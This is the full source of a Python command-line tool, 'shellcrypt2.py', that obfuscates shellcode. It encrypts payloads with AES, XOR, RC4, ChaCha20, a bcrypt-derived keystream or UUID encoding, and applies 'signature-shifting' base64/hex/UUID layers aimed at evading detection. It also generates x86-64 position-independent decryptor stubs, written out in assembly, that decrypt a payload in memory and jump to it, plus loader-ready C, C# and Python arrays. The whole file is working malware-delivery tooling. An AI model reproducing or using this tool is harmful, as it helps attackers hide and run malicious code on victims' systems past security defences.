#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
shellcrypt2.py - Shellcode Obfuscation Toolkit
=============================================
Encrypts / obfuscates raw shellcode with AES, XOR, UUID, RC4, bcrypt or
ChaCha20, applies an optional signature-shifting encoding layer
(base64 / hex / UUID strings), and can emit position-independent x86-64
decryptor stubs (XOR / RC4) that decrypt the payload in place and jump
to it, so the resulting blob can be executed from any base address.

Encryption methods
------------------
  aes      AES-256-CBC or AES-256-CTR (key 16/24/32 B, IV 16 B)
  xor      XOR with a 1..255 byte key (rolling multi-byte key support)
  uuid     shellcode -> list of UUID strings (bytes_le / GUID layout,
           suitable for UuidFromStringA style loaders)
  rc4      RC4 stream cipher (key 1..256 B)
  bcrypt   bcrypt used as a passphrase KDF; the deterministic hash
           output is stretched with SHA-256 and used as an XOR keystream
           (bcrypt itself is one-way - decryption needs the passphrase)
  chacha20 ChaCha20 stream cipher (32 B key, 8 B nonce)

Signature-shifting encode layer (--encode, applied after the cipher)
--------------------------------------------------------------------
  base64   ASCII base64        hex    ASCII hex string
  uuid     UUID string list     none   no extra layer

Output formats (-f)
-------------------
  bin      raw bytes          txt      text form
  c        C byte array       cs       C# byte array
  py       Python bytes       asm      stub assembly source (with --stub)

Position-independent stub (--stub xor|rc4)
------------------------------------------
  Assembles an x86-64 decryptor + encrypted payload + key into one blob:
      [stub code][payload][key][keylen]
  Map the blob as RWX at any address and jump to offset 0. Requires nasm
  (or the keystone-engine Python package) at runtime.

Usage examples
--------------
  python3 shellcrypt2.py -i shellcode.bin -m xor -o out.bin
  python3 shellcrypt2.py -i shellcode.bin -m aes --encode base64 -f c
  python3 shellcrypt2.py -i shellcode.bin -m rc4 -k 's3cr3t' --stub rc4 -o pic.bin
  python3 shellcrypt2.py -i shellcode.bin -m aes --encode base64 -f cs
  python3 shellcrypt2.py -i shellcode.bin -m uuid -f txt
  python3 shellcrypt2.py -i shellcode.bin -m bcrypt -k 'P@ssphrase!'

Every parameter required by a loader is echoed to stdout; save them with
--meta loader.json. Use --verify for a local encrypt/decrypt round-trip.
"""

import argparse
import base64
import binascii
import hashlib
import json
import os
import secrets
import string
import sys
import uuid

try:
    from Crypto.Cipher import AES, ARC4, ChaCha20
    from Crypto.Util.Padding import pad, unpad
    HAVE_CRYPTO = True
except ImportError:
    HAVE_CRYPTO = False

try:
    import bcrypt
    HAVE_BCRYPT = True
except ImportError:
    HAVE_BCRYPT = False

try:
    from keystone import Ks, KS_ARCH_X86, KS_MODE_64
    HAVE_KEYS = True
except ImportError:
    HAVE_KEYS = False

# --------------------------------------------------------------------------
# helpers
# --------------------------------------------------------------------------

def hexs(b):
    return binascii.hexlify(b).decode("ascii")


def load_input(args):
    if args.input and args.input != "-":
        with open(args.input, "rb") as f:
            data = f.read()
    elif args.hex is not None:
        data = binascii.unhexlify(args.hex)
    elif args.base64 is not None:
        data = base64.b64decode(args.base64)
    elif args.input == "-" or not sys.stdin.isatty():
        data = sys.stdin.buffer.read()
    else:
        raise SystemExit("no shellcode input: use -i FILE, -x HEX, -b BASE64, or pipe stdin")
    if not data:
        raise SystemExit("empty shellcode input")
    return data


def key_from_args(args, minlen, maxlen, default_len):
    """Return the key bytes: from -k/--key (raw utf-8 or --key-hex) or random."""
    if args.key is None:
        return secrets.token_bytes(default_len)
    raw = binascii.unhexlify(args.key) if args.key_hex else args.key.encode("utf-8")
    if not (minlen <= len(raw) <= maxlen):
        raise SystemExit("key must be %d..%d bytes (got %d)" % (minlen, maxlen, len(raw)))
    return raw

# --------------------------------------------------------------------------
# ciphers
# --------------------------------------------------------------------------

def xor_crypt(data, key):
    kl = len(key)
    return bytes(b ^ key[i % kl] for i, b in enumerate(data))


def aes_encrypt(data, key, mode, iv):
    if not HAVE_CRYPTO:
        raise SystemExit("AES requires pycryptodome: pip install pycryptodome")
    if len(key) not in (16, 24, 32):
        raise SystemExit("AES key must be 16, 24 or 32 bytes")
    if mode == "cbc":
        if len(iv) != 16:
            raise SystemExit("AES-CBC IV must be 16 bytes")
        return AES.new(key, AES.MODE_CBC, iv).encrypt(pad(data, 16))
    if len(iv) != 16:
        raise SystemExit("AES-CTR initial counter block must be 16 bytes")
    return AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=iv).encrypt(data)


def aes_decrypt(data, key, mode, iv):
    if not HAVE_CRYPTO:
        raise SystemExit("AES requires pycryptodome: pip install pycryptodome")
    if mode == "cbc":
        return unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(data), 16)
    return AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=iv).decrypt(data)


def rc4_crypt(data, key):
    if not HAVE_CRYPTO:
        raise SystemExit("RC4 requires pycryptodome: pip install pycryptodome")
    if not (1 <= len(key) <= 256):
        raise SystemExit("RC4 key must be 1..256 bytes")
    return ARC4.new(key).encrypt(data)


def chacha20_crypt(data, key, nonce):
    if not HAVE_CRYPTO:
        raise SystemExit("ChaCha20 requires pycryptodome: pip install pycryptodome")
    if len(key) != 32:
        raise SystemExit("ChaCha20 key must be 32 bytes")
    if len(nonce) != 8:
        raise SystemExit("ChaCha20 nonce must be 8 bytes")
    return ChaCha20.new(key=key, nonce=nonce).encrypt(data)


BCRYPT_ALPHABET = b"./ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"


def bcrypt_b64encode(raw):
    """Encode raw bytes in the bcrypt-specific base64 alphabet (3B -> 4 chars)."""
    out = bytearray()
    for i in range(0, len(raw), 3):
        chunk = raw[i:i + 3]
        v = chunk[0] << 16
        if len(chunk) > 1:
            v |= chunk[1] << 8
        if len(chunk) > 2:
            v |= chunk[2]
        for j in range(4 if len(chunk) == 3 else 2):
            out.append(BCRYPT_ALPHABET[(v >> (18 - 6 * j)) & 0x3f])
    return bytes(out)


def make_bcrypt_salt(raw16, rounds):
    """bcrypt salt string: either random (gensalt) or built from 16 raw bytes."""
    if raw16 is None:
        return bcrypt.gensalt(rounds=rounds, prefix=b"2b")
    if len(raw16) != 16:
        raise SystemExit("bcrypt salt must be 16 bytes")
    return b"$2b$%02d$" % rounds + bcrypt_b64encode(raw16)


def bcrypt_derive(hashstr, length):
    """Stretch the bcrypt hash string into a keystream (SHA-256 counter mode)."""
    out = bytearray()
    ctr = 0
    while len(out) < length:
        out += hashlib.sha256(hashstr + ctr.to_bytes(4, "little")).digest()
        ctr += 1
    return bytes(out[:length])


def bcrypt_encrypt(data, passphrase, salt_str):
    if not HAVE_BCRYPT:
        raise SystemExit("bcrypt requires the bcrypt package: pip install bcrypt")
    if len(passphrase) > 72:
        raise SystemExit("bcrypt passphrase longer than 72 bytes is not supported")
    hashstr = bcrypt.hashpw(passphrase, salt_str)
    key = bcrypt_derive(hashstr, len(data))
    return bytes(b ^ k for b, k in zip(data, key)), hashstr


def bcrypt_decrypt(data, passphrase, salt_str):
    if not HAVE_BCRYPT:
        raise SystemExit("bcrypt requires the bcrypt package: pip install bcrypt")
    hashstr = bcrypt.hashpw(passphrase, salt_str)
    key = bcrypt_derive(hashstr, len(data))
    return bytes(b ^ k for b, k in zip(data, key))


def uuid_encode(data):
    """bytes -> list of GUID-format UUID strings (Data1/2/3 little-endian)."""
    padn = (-len(data)) % 16
    d = data + b"\x00" * padn
    return [str(uuid.UUID(bytes_le=d[i:i + 16])) for i in range(0, len(d), 16)]


def uuid_decode(text):
    lines = [ln.strip() for ln in text.strip().splitlines() if ln.strip()]
    return b"".join(uuid.UUID(ln).bytes_le for ln in lines)

# --------------------------------------------------------------------------
# signature-shifting encode layers
# --------------------------------------------------------------------------

def apply_encode(data, enc):
    if enc == "base64":
        return base64.b64encode(data)
    if enc == "hex":
        return binascii.hexlify(data)
    if enc == "uuid":
        return ("\n".join(uuid_encode(data)) + "\n").encode("ascii")
    return data


def reverse_encode(data, enc):
    if enc == "base64":
        return base64.b64decode(data)
    if enc == "hex":
        return binascii.unhexlify(data)
    if enc == "uuid":
        return uuid_decode(data.decode("ascii"))
    return data

# --------------------------------------------------------------------------
# position-independent x86-64 decryptor stubs (RIP-relative, PIC)
# --------------------------------------------------------------------------

XOR_STUB = r"""
BITS 64
start:
    lea rsi, [rel payload]
    mov rcx, __LEN__
    lea rbx, [rel key]
    movzx r8, byte [rel keylen]
    xor r9, r9
.loop:
    movzx rax, byte [rbx+r9]
    xor byte [rsi], al
    inc rsi
    inc r9
    cmp r9, r8
    jne .cont
    xor r9, r9
.cont:
    dec rcx
    jnz .loop
    lea rsi, [rel payload]
    jmp rsi
payload:
    db __PAYLOAD__
key:
    db __KEY__
keylen:
    db __KEYLEN__
"""

RC4_STUB = r"""
BITS 64
start:
    lea rsi, [rel payload]
    mov rcx, __LEN__
    lea rbx, [rel key]
    movzx r8, byte [rel keylen]
    sub rsp, 0x100
    xor r10, r10
.sbox:
    mov byte [rsp+r10], r10b
    inc r10
    cmp r10, 0x100
    jne .sbox
    xor r9, r9
    xor r10, r10
    xor r11, r11
.ksa:
    movzx rax, byte [rsp+r10]
    add r9, rax
    movzx rax, byte [rbx+r11]
    add r9, rax
    and r9d, 0xff
    movzx r12, byte [rsp+r10]
    movzx r13, byte [rsp+r9]
    mov byte [rsp+r10], r13b
    mov byte [rsp+r9], r12b
    inc r11
    cmp r11, r8
    jne .kcont
    xor r11, r11
.kcont:
    inc r10
    cmp r10d, 0x100
    jne .ksa
    xor r9, r9
    xor r10, r10
    mov rdx, rsi
.prga:
    test rcx, rcx
    jz .done
    inc r10d
    and r10d, 0xff
    movzx rax, byte [rsp+r10]
    add r9, rax
    and r9d, 0xff
    movzx r12, byte [rsp+r10]
    movzx r13, byte [rsp+r9]
    mov byte [rsp+r10], r13b
    mov byte [rsp+r9], r12b
    movzx rax, byte [rsp+r10]
    movzx r13, byte [rsp+r9]
    add rax, r13
    and eax, 0xff
    movzx rax, byte [rsp+rax]
    xor byte [rsi], al
    inc rsi
    dec rcx
    jmp .prga
.done:
    add rsp, 0x100
    jmp rdx
payload:
    db __PAYLOAD__
key:
    db __KEY__
keylen:
    db __KEYLEN__
"""


def db_bytes(b):
    return ", ".join("0x%02x" % x for x in b)


def assemble(asm):
    if HAVE_KEYS:
        ks = Ks(KS_ARCH_X86, KS_MODE_64)
        code, _ = ks.asm(asm)
        return bytes(code)
    try:
        import subprocess
        import tempfile
        with tempfile.NamedTemporaryFile("w", suffix=".asm", delete=False) as fh:
            fh.write(asm)
            apath = fh.name
        opath = apath + ".bin"
        subprocess.run(["nasm", "-f", "bin", apath, "-o", opath],
                       check=True, capture_output=True)
        with open(opath, "rb") as fh:
            out = fh.read()
        os.unlink(apath)
        os.unlink(opath)
        return out
    except Exception as e:
        raise SystemExit("--stub needs keystone-engine (pip install keystone-engine) "
                         "or nasm; assembly failed: %s" % e)


def build_stub(method, payload, key):
    tpl = XOR_STUB if method == "xor" else RC4_STUB
    tpl = tpl.replace("__LEN__", str(len(payload)))
    tpl = tpl.replace("__PAYLOAD__", db_bytes(payload))
    tpl = tpl.replace("__KEY__", db_bytes(key))
    tpl = tpl.replace("__KEYLEN__", str(len(key)))
    return assemble(tpl)


def build_stub_source(method, payload, key):
    tpl = XOR_STUB if method == "xor" else RC4_STUB
    return (tpl.replace("__LEN__", str(len(payload)))
               .replace("__PAYLOAD__", db_bytes(payload))
               .replace("__KEY__", db_bytes(key))
               .replace("__KEYLEN__", str(len(key))))

# --------------------------------------------------------------------------
# output formatters
# --------------------------------------------------------------------------

def fmt_c(data, name):
    lines = ["unsigned char %s[] = {" % name]
    for i in range(0, len(data), 12):
        lines.append("    " + ", ".join("0x%02x" % b for b in data[i:i + 12]) + ",")
    lines.append("};")
    return "\n".join(lines) + "\n"


def fmt_cs(data, name):
    lines = ["byte[] %s = new byte[] {" % name]
    for i in range(0, len(data), 12):
        lines.append("    " + ", ".join("0x%02x" % b for b in data[i:i + 12]) + ",")
    lines.append("};")
    return "\n".join(lines) + "\n"


def fmt_py(data, name):
    return "%s = %r\n" % (name, bytes(data))

# --------------------------------------------------------------------------
# main
# --------------------------------------------------------------------------

def build_parser():
    p = argparse.ArgumentParser(
        prog="shellcrypt2.py",
        description="Shellcode obfuscation: AES/XOR/UUID/RC4/bcrypt/ChaCha20, "
                    "signature-shifting encodings and position-independent x86-64 stubs.",
        epilog="Examples:\n"
               "  %(prog)s -i sc.bin -m aes --encode base64 -f c\n"
               "  %(prog)s -i sc.bin -m rc4 -k secret --stub rc4 -o pic.bin\n"
               "  %(prog)s -i sc.bin -m uuid -f txt",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    src = p.add_mutually_exclusive_group()
    src.add_argument("-i", "--input", metavar="FILE",
                     help="raw shellcode file ('-' = stdin)")
    src.add_argument("-x", "--hex", metavar="HEX", help="shellcode as hex string")
    src.add_argument("-b", "--base64", metavar="B64", help="shellcode as base64 string")
    p.add_argument("-m", "--method", default="xor",
                   choices=["aes", "xor", "uuid", "rc4", "bcrypt", "chacha20", "none"],
                   help="encryption method (default: xor)")
    p.add_argument("-k", "--key", metavar="KEY",
                   help="key material (utf-8, or hex with --key-hex); random if omitted")
    p.add_argument("--key-hex", action="store_true",
                   help="treat -k as a hex string")
    p.add_argument("--xor-keysize", type=int, default=16, metavar="N",
                   help="random XOR key length in bytes when -k omitted (default: 16)")
    p.add_argument("--aes-mode", choices=["cbc", "ctr"], default="cbc",
                   help="AES mode (default: cbc)")
    p.add_argument("--iv", metavar="HEX", help="AES IV (CBC/CTR, 16 bytes)")
    p.add_argument("--nonce", metavar="HEX", help="ChaCha20 nonce (8 bytes)")
    p.add_argument("--salt", metavar="HEX", help="bcrypt salt (16 bytes)")
    p.add_argument("--bcrypt-rounds", type=int, default=10, metavar="N",
                   help="bcrypt cost factor (default: 10)")
    p.add_argument("--encode", choices=["none", "base64", "hex", "uuid"], default="none",
                   help="signature-shifting encoding layer applied after the cipher")
    p.add_argument("--stub", choices=["xor", "rc4"],
                   help="emit position-independent x86-64 decryptor stub (PIC blob)")
    p.add_argument("-f", "--format", choices=["bin", "txt", "c", "cs", "csharp", "py", "asm"], default="bin",
                   help="output format: bin raw bytes, txt text form, c/cs/py source, "
                        "asm stub source (default: bin)")
    p.add_argument("--c-name", default="payload", metavar="NAME", help="C array name")
    p.add_argument("--cs-name", default="payload", metavar="NAME", help="C# array name")
    p.add_argument("--py-name", default="payload", metavar="NAME", help="Python var name")
    p.add_argument("-o", "--output", metavar="FILE", help="write output to file")
    p.add_argument("--meta", metavar="JSON", help="write loader parameters to JSON file")
    p.add_argument("--verify", action="store_true",
                   help="decrypt the result locally and confirm it matches the input")
    p.add_argument("-q", "--quiet", action="store_true", help="suppress summary output")
    return p


def run_pipeline(sc, args):
    """Encrypt -> encode -> (optional) stub. Returns (payload_bytes, params, stub_source)."""
    method = args.method
    params = {"method": method, "encode": args.encode, "original_len": len(sc)}
    key = None

    if method == "uuid":
        if args.encode != "none":
            raise SystemExit("-m uuid already encodes to UUID strings; drop --encode")
        body = sc
    elif method == "none":
        body = sc
    else:
        if method == "xor":
            key = key_from_args(args, 1, 255, args.xor_keysize)
            body = xor_crypt(sc, key)
            params.update(key_hex=hexs(key), key_len=len(key))
        elif method == "aes":
            key = key_from_args(args, 16, 32, 32)
            iv = binascii.unhexlify(args.iv) if args.iv else secrets.token_bytes(16)
            body = aes_encrypt(sc, key, args.aes_mode, iv)
            params.update(key_hex=hexs(key), iv_hex=hexs(iv), aes_mode=args.aes_mode)
        elif method == "rc4":
            key = key_from_args(args, 1, 256, 16)
            body = rc4_crypt(sc, key)
            params.update(key_hex=hexs(key), key_len=len(key))
        elif method == "chacha20":
            key = key_from_args(args, 32, 32, 32)
            nonce = binascii.unhexlify(args.nonce) if args.nonce else secrets.token_bytes(8)
            body = chacha20_crypt(sc, key, nonce)
            params.update(key_hex=hexs(key), nonce_hex=hexs(nonce))
        elif method == "bcrypt":
            passphrase = args.key.encode("utf-8") if args.key else "".join(
                secrets.choice(string.ascii_letters + string.digits) for _ in range(24)
            ).encode("utf-8")
            salt_str = make_bcrypt_salt(
                binascii.unhexlify(args.salt) if args.salt else None, args.bcrypt_rounds)
            body, hashstr = bcrypt_encrypt(sc, passphrase, salt_str)
            params.update(passphrase=passphrase.decode("utf-8"),
                          bcrypt_hash=hashstr.decode("ascii"),
                          bcrypt_salt=salt_str.decode("ascii"),
                          bcrypt_rounds=args.bcrypt_rounds)

    if method != "uuid":
        body = apply_encode(body, args.encode)
    else:
        body = apply_encode(body, "uuid")
    params.update(payload_len=len(body))

    stub_src = None
    if args.stub:
        if method not in ("xor", "rc4"):
            raise SystemExit("--stub only supports -m xor or -m rc4 (see --help)")
        if args.encode != "none":
            raise SystemExit("--stub cannot be combined with --encode")
        if args.format == "asm":
            stub_src = build_stub_source(args.stub, body, key)
        else:
            blob = build_stub(args.stub, body, key)
            params.update(stub=args.stub, blob_len=len(blob),
                          layout="[stub][payload][key][keylen] - map RWX, jump to offset 0")
            body = blob
    return body, params, stub_src


def verify_roundtrip(sc, body, args, params):
    """Reverse the encode layer + cipher and compare with the original shellcode."""
    try:
        if args.stub:
            # PIC blob layout: [code][payload][key][keylen]
            # Assemble a probe with the same key to learn the code length, then
            # extract the embedded ciphertext and decrypt it with the same logic
            # the stub performs.
            key = binascii.unhexlify(params["key_hex"])
            probe = build_stub(args.stub, b"\x90" * len(sc), key)
            code_len = len(probe) - len(sc) - len(key) - 1
            ct = body[code_len:code_len + len(sc)]
            plain = xor_crypt(ct, key) if args.method == "xor" else rc4_crypt(ct, key)
            return plain == sc, plain if plain == sc else None
        if args.method == "uuid":
            plain = reverse_encode(body, "uuid")
        else:
            plain = reverse_encode(body, args.encode) if args.encode != "none" else body
        m = args.method
        if m == "xor":
            plain = xor_crypt(plain, binascii.unhexlify(params["key_hex"]))
        elif m == "aes":
            plain = aes_decrypt(plain, binascii.unhexlify(params["key_hex"]),
                                params["aes_mode"], binascii.unhexlify(params["iv_hex"]))
        elif m == "rc4":
            plain = rc4_crypt(plain, binascii.unhexlify(params["key_hex"]))
        elif m == "chacha20":
            plain = chacha20_crypt(plain, binascii.unhexlify(params["key_hex"]),
                                   binascii.unhexlify(params["nonce_hex"]))
        elif m == "bcrypt":
            plain = bcrypt_decrypt(plain, params["passphrase"].encode("utf-8"),
                                   params["bcrypt_salt"].encode("ascii"))
        return plain[:len(sc)] == sc, plain[:len(sc)] if plain[:len(sc)] == sc else None
    except Exception as e:
        return False, None


def main():
    args = build_parser().parse_args()
    sc = load_input(args)
    body, params, stub_src = run_pipeline(sc, args)

    if args.verify:
        ok, _ = verify_roundtrip(sc, body, args, params)
        params["verify"] = "PASS" if ok else "FAIL"

    out = None
    if args.format == "txt":
        out = body.decode("ascii", errors="replace")
    elif args.format == "c":
        out = fmt_c(body, args.c_name)
    elif args.format in ("cs", "csharp"):
        out = fmt_cs(body, args.cs_name)
    elif args.format == "py":
        out = fmt_py(body, args.py_name)
    elif args.format == "asm":
        if stub_src is None:
            raise SystemExit("-f asm requires --stub xor|rc4")
        out = stub_src
    else:
        out = body

    if args.output:
        mode = "w" if isinstance(out, str) else "wb"
        with open(args.output, mode) as fh:
            fh.write(out)
    elif isinstance(out, str):
        sys.stdout.write(out)
    else:
        sys.stdout.buffer.write(out)

    if args.meta:
        with open(args.meta, "w") as fh:
            json.dump(params, fh, indent=2)

    if args.verify:
        sys.stderr.write("[+] verify     : %s\n" % params["verify"])

    if not args.quiet:
        print("\n[+] input      : %d bytes" % len(sc))
        print("[+] method     : %s" % params["method"])
        if params["method"] == "bcrypt":
            print("[+] passphrase : %s" % params["passphrase"])
            print("[+] bcrypt hash: %s" % params["bcrypt_hash"])
        else:
            if "key_hex" in params:
                print("[+] key        : %s" % params["key_hex"])
        if "iv_hex" in params:
            print("[+] iv         : %s" % params["iv_hex"])
        if "nonce_hex" in params:
            print("[+] nonce      : %s" % params["nonce_hex"])
        print("[+] encode     : %s" % params["encode"])
        if "stub" in params:
            print("[+] stub       : x86-64 PIC %s decryptor (%s)" % (params["stub"], params["layout"]))
        print("[+] output     : %d bytes (%s)" % (len(out) if isinstance(out, bytes) else len(out.encode()), args.format))
        if args.meta:
            print("[+] meta       : %s" % args.meta)


if __name__ == "__main__":
    main()
